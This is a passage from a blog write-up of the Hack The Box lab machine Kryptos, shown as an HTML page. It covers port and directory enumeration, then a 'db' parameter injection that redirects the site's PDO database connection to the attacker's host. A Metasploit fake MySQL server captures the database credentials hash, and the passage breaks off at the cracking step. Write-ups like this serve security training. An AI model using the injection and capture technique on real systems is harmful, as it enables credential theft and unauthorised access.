<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">

    
      <link rel="icon" href="/favicon.png" />
    

    <title>
        
          Hack The Box - Kryptos - 0xRick
        
    </title>
    <style>
  #carbonads {
    border: 1px solid black;
    border-radius: 7px;
    border-spacing: 7px;
    display: block;
    overflow: hidden;
    padding: 1em;
    line-height: 1.5;
  }
  #carbonads span {
    position: relative;
    display: block;
    overflow: hidden;
  }
  .carbon-img {
    float: left;
    margin-right: 1em;
  }
  .carbon-img img {
    display: block;
  }
  .carbon-text {
    display: block;
    float: left;
    max-width: calc(100% - 130px - 1em);
    text-align: left;
  }
  .carbon-poweredby {
    position: absolute;
    left: 142px;
    bottom: 0;
    display: block;
    font-size: .8em;
    line-height: 1;
    letter-spacing: 1px;
    }
    </style>
    <!-- Spectre.css framework -->
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-exp.min.css">
    <link rel="stylesheet" href="https://unpkg.com/spectre.css/dist/spectre-icons.min.css">

    <!-- theme css & js -->
    
<link rel="stylesheet" href="/css/book.css">

    
<script src="/js/book.js"></script>


    <!-- tocbot -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
    
    <!-- katex -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">

    
<!-- Google Analytics -->
<script>
(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

ga('create', 'UA-97164925-2', 'auto');
ga('send', 'pageview');
</script>
<!-- End Google Analytics -->

    
<script src="https://cdnjs.cloudflare.com/ajax/libs/zooming/2.1.1/zooming.min.js"></script>
<script>
document.addEventListener('DOMContentLoaded', function () {
    const zooming = new Zooming()
    zooming.listen('.book-content img')
})
</script>

    <style>
      #htbbadge{
        float: left;
      }
    </style>
<meta name="generator" content="Hexo 4.2.0"></head>

<body>

<div class="book-container">
  <div class="book-sidebar">
    <div class="book-brand">
  <a href="/">
    <img src="/favicon.png">
    <span>0XRICK</span>
  </a>
</div>
    <div class="book-menu">
  <ul>
<li><a href="/">Home</a></li>
</ul>
<h1 id="Categories"><a href="#Categories" class="headerlink" title="Categories"></a>Categories</h1><h2 id="Hack-The-Box-Write-ups"><a href="#Hack-The-Box-Write-ups" class="headerlink" title="Hack The Box Write-ups"></a>Hack The Box Write-ups</h2><ul>
<li><a href="/hack-the-box/ai/">Hack The Box - AI</a></li>
<li><a href="/hack-the-box/player/">Hack The Box - Player</a></li>
<li><a href="/hack-the-box/bitlab/">Hack The Box - Bitlab</a></li>
<li><a href="/hack-the-box/craft/">Hack The Box - Craft</a></li>
<li><a href="/hack-the-box/smasher2/">Hack The Box - Smasher2</a></li>
<li><a href="/hack-the-box/wall/">Hack The Box - Wall</a></li>
<li><a href="/hack-the-box/heist/">Hack The Box - Heist</a></li>
<li><a href="/hack-the-box/chainsaw/">Hack The Box - Chainsaw</a></li>
<li><a href="/hack-the-box/networked/">Hack The Box - Networked</a></li>
<li><a href="/hack-the-box/jarvis/">Hack The Box - Jarvis</a></li>
<li><a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></li>
<li><a href="/hack-the-box/safe/">Hack The Box - Safe</a></li>
<li><a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a></li>
<li><a href="/hack-the-box/writeup/">Hack The Box - Writeup</a></li>
<li><a href="/hack-the-box/ghoul">Hack The Box - Ghoul</a></li>
<li><a href="/hack-the-box/swagshop/">Hack The Box - Swagshop</a></li>
<li><a href="/hack-the-box/kryptos/">Hack The Box - Kryptos</a></li>
<li><a href="/hack-the-box/luke/">Hack The Box - Luke</a></li>
<li><a href="/hack-the-box/bastion/">Hack The Box - Bastion</a></li>
<li><a href="/hack-the-box/bastion-2/">Hack The Box - Bastion (Commando)</a></li>
<li><a href="/hack-the-box/onetwoseven/">Hack The Box - OneTwoSeven</a></li>
<li><a href="/hack-the-box/unattended/">Hack The Box - Unattended</a></li>
<li><a href="/hack-the-box/helpline/">Hack The Box - Helpline</a></li>
<li><a href="/hack-the-box/arkham/">Hack The Box - Arkham</a></li>
<li><a href="/hack-the-box/fortune">Hack The Box - Fortune</a></li>
<li><a href="/hack-the-box/lacasadepapel/">Hack The Box - LaCasaDePapel</a></li>
<li><a href="/hack-the-box/ctf/">Hack The Box - CTF</a></li>
<li><a href="/c/categories/#Hack-The-Box"><strong>Older</strong></a></li>
</ul>
<h2 id="Wizard-Labs-Write-ups"><a href="#Wizard-Labs-Write-ups" class="headerlink" title="Wizard Labs Write-ups"></a>Wizard Labs Write-ups</h2><ul>
<li><a href="/wizard-labs/devlife/">Wizard Labs - Devlife</a></li>
<li><a href="/wizard-labs/dummy/">wizard Labs - Dummy</a></li>
</ul>
<h2 id="Basic-Binary-Exploitation"><a href="#Basic-Binary-Exploitation" class="headerlink" title="Basic Binary Exploitation"></a>Basic Binary Exploitation</h2><ul>
<li><a href="/binary-exploitation/bof6/">Bof: re2libc - protostar stack6</a></li>
<li><a href="/binary-exploitation/bof5/">Bof: ShellCode Injection - protostar stack5</a></li>
<li><a href="/binary-exploitation/bof4/">Bof: Taking control of the instruction pointer - protostar stack4</a></li>
<li><a href="/binary-exploitation/bof3/">Bof: Overwriting function pointers - protostar stack3</a></li>
<li><a href="/binary-exploitation/bof2/">Bof: Overwriting stack variables - protostar stack1,2</a></li>
<li><a href="/binary-exploitation/bof1/">Buffer Overflow Explained</a></li>
</ul>
<h2 id="Pwn-Challenges-Write-ups"><a href="#Pwn-Challenges-Write-ups" class="headerlink" title="Pwn Challenges Write-ups"></a>Pwn Challenges Write-ups</h2><ul>
<li><a href="/pwn/collision/">pwnable.kr - collision</a></li>
<li><a href="/pwn/bof/">pwnable.kr - bof</a></li>
<li><a href="/pwn/fd/">pwnable.kr - fd</a></li>
</ul>
<h2 id="Misc-CTF-Write-ups"><a href="#Misc-CTF-Write-ups" class="headerlink" title="Misc CTF Write-ups"></a>Misc CTF Write-ups</h2><ul>
<li><a href="/ctfs/egctf-qual/">EGCTF 2019 - Qualification Round</a></li>
</ul>
<h2 id="Lists"><a href="#Lists" class="headerlink" title="Lists"></a>Lists</h2><ul>
<li><a href="/lists/stego/">Steganography</a></li>
</ul>

</div>


<script src="/js/book-menu.js"></script>

  </div>

  <div class="off-canvas-content">
    <div class="columns">
      <div class="column col-10 col-lg-12">
        <div class="book-navbar">
          <!-- For Responsive Layout -->

<header class="navbar">
  <section class="navbar-section">
    <a onclick="open_sidebar()">
      <i class="icon icon-menu"></i>
    </a>
  </section>
</header>

        </div>
        <div class="book-content">
          <div class="book-post">
  <div> <script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script> </div> <br>
  <h1 id="Hack-The-Box-Kryptos"><a href="#Hack-The-Box-Kryptos" class="headerlink" title="Hack The Box - Kryptos"></a>Hack The Box - Kryptos</h1><h2 id="Quick-Summary"><a href="#Quick-Summary" class="headerlink" title="Quick Summary"></a>Quick Summary</h2><p>Hey guys today Kryptos retired and here’s my write-up about it. It’s one of the hardest boxes I’ve ever seen and it definitely taught me a lot. As you may have already guessed, it had a lot of cryptography stuff, it also had a long chain of web vulnerabilities, starting with authentication bypass and ending with SQL injection allowing arbitrary file write. It’s a Linux box and its ip is <code>10.10.10.129</code>, I added it to <code>/etc/hosts</code> as <code>kryptos.htb</code>. Let’s jump right in !<br><img src="/images/hackthebox/kryptos/0.png" alt=""></p>
<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><p>As always we will start with <code>nmap</code> to scan for open ports and services :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# nmap -sV -sV -sT -o nmapinitial kryptos.htb</span><br><span class="line">Starting Nmap 7.70 ( https:&#x2F;&#x2F;nmap.org ) at 2019-09-12 21:50 EET</span><br><span class="line">Nmap scan report for kryptos.htb (10.10.10.129)</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 34.39 seconds</span><br></pre></td></tr></table></figure>
<p>Only <code>http</code> on port 80 and ssh.</p>
<h2 id="Initial-Web-Enumeration"><a href="#Initial-Web-Enumeration" class="headerlink" title="Initial Web Enumeration"></a>Initial Web Enumeration</h2><p><code>http://kryptos.htb</code> :</p>
<p><img src="/images/hackthebox/kryptos/1.png" alt=""><br>The index page is a login page titled <code>Cryptor Login</code>, I checked the directories with <code>gobuster</code> but the only interesting thing I got was a forbidden directory called <code>dev</code> :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# gobuster -u http:&#x2F;&#x2F;kryptos.htb&#x2F; -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt -to 120s -t 100</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Gobuster v2.0.1              OJ Reeves (@TheColonial)</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">[+] Mode         : dir</span><br><span class="line">[+] Url&#x2F;Domain   : http:&#x2F;&#x2F;kryptos.htb&#x2F;</span><br><span class="line">[+] Threads      : 100</span><br><span class="line">[+] Wordlist     : &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirb&#x2F;common.txt</span><br><span class="line">[+] Status codes : 200,204,301,302,307,403</span><br><span class="line">[+] Timeout      : 2m0s</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">2019&#x2F;09&#x2F;12 22:56:57 Starting gobuster</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">&#x2F;.htpasswd (Status: 403)</span><br><span class="line">&#x2F;.hta (Status: 403)</span><br><span class="line">&#x2F;.htaccess (Status: 403)</span><br><span class="line">&#x2F;cgi-bin&#x2F; (Status: 403)</span><br><span class="line">&#x2F;css (Status: 301)</span><br><span class="line">&#x2F;dev (Status: 403)</span><br><span class="line">&#x2F;index.php (Status: 200)</span><br><span class="line">&#x2F;server-status (Status: 403)</span><br></pre></td></tr></table></figure>
<p>I tested the login page with <code>test:test</code> and I intercepted the request with <code>burp</code>:</p>
<p><img src="/images/hackthebox/kryptos/2.png" alt=""><br><img src="/images/hackthebox/kryptos/3.png" alt=""><br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 116</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=test&amp;password=test&amp;db=cryptor&amp;token=fe47b3105c71089f25ea5342c41d7d9eb972b989c22db6c70b1f8d1f9c967ace&amp;login=</span><br></pre></td></tr></table></figure>
<p>I noticed a parameter called <code>db</code>, I changed its value to <code>test</code> to see what will happen :<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 113</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=test&amp;password=test&amp;db=test&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 12 Sep 2019 19:57:27 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">PDOException code: 1044</span><br></pre></td></tr></table></figure>
<p>I got a <code>PDO</code> exception, I searched for <code>PDO</code> and found <a href="https://www.php.net/manual/en/book.pdo.php" target="_blank" rel="noopener">this page</a>. I looked at the user contributed notes and saw this example :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$db = <span class="keyword">new</span> PDO(<span class="string">'dblib:host=your_hostname;dbname=your_db;charset=UTF-8'</span>, $user, $pass);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>I guessed that the POST parameter <code>db</code> is being used in a similar code and <code>dbname</code> gets its value from it, so I thought of injecting that parameter with <code>;host=10.10.xx.xx</code> and see If I can successfully change the host parameter.<br>Request :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 133</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=</span><br></pre></td></tr></table></figure>
<p>Response :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Date</span>: Thu, 12 Sep 2019 20:01:29 GMT</span><br><span class="line"><span class="attribute">Server</span>: Apache/2.4.29 (Ubuntu)</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-store, no-cache, must-revalidate</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Content-Length</span>: 23</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Content-Type</span>: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">PDOException code: 2002</span><br></pre></td></tr></table></figure>
<p>I got another exception code (<code>2002</code>) which is <code>Connection refused</code>, I listened on port 3306 (Default <code>mysql</code> port) with <code>nc</code> to verify that I’m getting a connection, then I sent the same request again. And I got a connection :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;kryptos# nc -lvnp 3306</span><br><span class="line">Ncat: Version 7.70 ( https:&#x2F;&#x2F;nmap.org&#x2F;ncat )</span><br><span class="line">Ncat: Listening on :::3306</span><br><span class="line">Ncat: Listening on 0.0.0.0:3306</span><br><span class="line">Ncat: Connection from 10.10.10.129.</span><br><span class="line">Ncat: Connection from 10.10.10.129:47530.</span><br></pre></td></tr></table></figure>
<p>We can run a fake <code>mysql</code> database and use this injection to make the server send the login query to our database, the database will respond that the credentials are valid and we will be able to bypass the authentication. However, to do this we need to get the database credentials and the login query, then depending on them we will setup the database. </p>
<h2 id="Authentication-Bypass-Getting-Database-Credentials"><a href="#Authentication-Bypass-Getting-Database-Credentials" class="headerlink" title="Authentication Bypass: Getting Database Credentials"></a>Authentication Bypass: Getting Database Credentials</h2><p>To get the database credentials I used <code>metasploit</code>‘s module <code>auxiliary/server/capture/mysql</code>. It will run as a fake <code>mysql</code> server and capture the username and the password hash, the option <code>JOHNPWFILE</code>  will save the hash in john format in an external file which we can use later to crack the hash.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary&#x2F;server&#x2F;capture&#x2F;mysql                                                                                                                                                                         </span><br><span class="line">msf5 auxiliary(server&#x2F;capture&#x2F;mysql) &gt; show options</span><br><span class="line">Module options (auxiliary&#x2F;server&#x2F;capture&#x2F;mysql):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                           Required  Description</span><br><span class="line">   ----        ---------------                           --------  -----------</span><br><span class="line">   CAINPWFILE                                            no        The local filename to store the hashes in Cain&amp;Abel format</span><br><span class="line">   CHALLENGE   112233445566778899AABBCCDDEEFF1122334455  yes       The 16 byte challenge</span><br><span class="line">   JOHNPWFILE                                            no        The prefix to the local filename to store the hashes in JOHN format</span><br><span class="line">   SRVHOST     0.0.0.0                                   yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><br><span class="line">   SRVPORT     3306                                      yes       The local port to listen on.</span><br><span class="line">   SRVVERSION  5.5.16                                    yes       The server version to report in the greeting response</span><br><span class="line">   SSL         false                                     no        Negotiate SSL for incoming connections                                                                             </span><br><span class="line">   SSLCert                                               no        Path to a custom SSL certificate (default is randomly generated)                                                                               </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name     Description</span><br><span class="line">   ----     -----------</span><br><span class="line">   Capture</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 auxiliary(server&#x2F;capture&#x2F;mysql) &gt; set JOHNPWFILE .&#x2F;hash</span><br><span class="line">JOHNPWFILE &#x3D;&gt; .&#x2F;hash</span><br><span class="line">msf5 auxiliary(server&#x2F;capture&#x2F;mysql) &gt; set SRVHOST 10.10.xx.xx</span><br><span class="line">SRVHOST &#x3D;&gt; 10.10.xx.xx</span><br><span class="line">msf5 auxiliary(server&#x2F;capture&#x2F;mysql) &gt; run</span><br><span class="line">[*] Auxiliary module running as background job 0.</span><br><span class="line"></span><br><span class="line">[*] Started service listener on 10.10.xx.xx:3306</span><br><span class="line">[*] Server started.</span><br></pre></td></tr></table></figure>
<p>After running the module I sent this request again :</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: kryptos.htb</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://kryptos.htb/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 133</span><br><span class="line"><span class="attribute">Cookie</span>: PHPSESSID=99ub5git6oc7mka23ibjdorla2</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"></span><br><span class="line">username=test&amp;password=test&amp;db=cryptor;host=10.10.xx.xx&amp;token=eca86a50f4eaf5fbcceb0e73f9f0d93109bcb83658e8cdbe18248a5f93faa293&amp;login=</span><br></pre></td></tr></table></figure>
<p>And the server caught the credentials :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[+] 10.10.10.129:47538 - User: dbuser; Challenge: 112233445566778899aabbccddeeff1122334455; Response: 73def07da6fba5dcc1b19c918dbd998e0d1f3f9d; Database: cryptor</span><br></pre></td></tr></table></figure>
<p>I cracked it with john :</p>
